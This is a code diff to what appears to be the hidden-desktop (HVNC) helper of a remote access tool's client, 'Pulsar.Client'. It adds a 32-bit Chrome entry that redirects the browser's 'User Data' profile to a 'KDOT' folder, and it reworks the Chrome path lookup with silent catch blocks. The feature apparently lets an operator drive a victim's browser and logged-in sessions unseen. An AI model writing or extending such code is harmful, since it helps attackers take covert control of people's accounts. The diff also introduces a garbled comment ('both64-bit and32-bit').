@@ -30,6 +30,14 @@ namespace Pulsar.Client.Helper.HVNC
                 }
             },
             {
+                "ChromeX86", new BrowserConfig
+                {
+                    ExecutablePath = Path.Combine(Environment.GetEnvironmentVariable("PROGRAMFILES(X86)"), "Google\\Chrome\\Application\\chrome.exe"),
+                    SearchPattern = "Local\\Google\\Chrome\\User Data",
+                    ReplacementPath = "Local\\Google\\Chrome\\KDOT"
+                }
+            },
+            {
                 "Edge", new BrowserConfig
                 {
                     ExecutablePath = Path.Combine(Environment.GetEnvironmentVariable("PROGRAMFILES(X86)"), "Microsoft\\Edge\\Application\\msedge.exe"),
@@ -82,16 +90,41 @@ namespace Pulsar.Client.Helper.HVNC
         }
 
         /// <summary>
-        /// Gets the first valid Chrome configuration (checks both 64-bit and 32-bit)
+        /// Gets the first valid Chrome configuration (checks both64-bit and32-bit)
         /// </summary>
         /// <returns>Valid Chrome configuration or null if Chrome is not installed</returns>
         public static BrowserConfig GetChromeConfig()
         {
-            // x64
-            var chrome64 = GetConfig("Chrome");
-            if (chrome64 != null && File.Exists(chrome64.ExecutablePath))
+            var chromeConfig = GetConfig("Chrome");
+            if (chromeConfig != null)
             {
-                return chrome64;
+                try
+                {
+                    if (!string.IsNullOrEmpty(chromeConfig.ExecutablePath) && File.Exists(chromeConfig.ExecutablePath))
+                    {
+                        return chromeConfig;
+                    }
+                }
+                catch
+                {
+                    // ignore and continue
+                }
+            }
+
+            var chromeX86 = GetConfig("ChromeX86");
+            if (chromeX86 != null)
+            {
+                try
+                {
+                    if (!string.IsNullOrEmpty(chromeX86.ExecutablePath) && File.Exists(chromeX86.ExecutablePath))
+                    {
+                        return chromeX86;
+                    }
+                }
+                catch
+                {
+                    // ignore
+                }
             }
 
             return null;
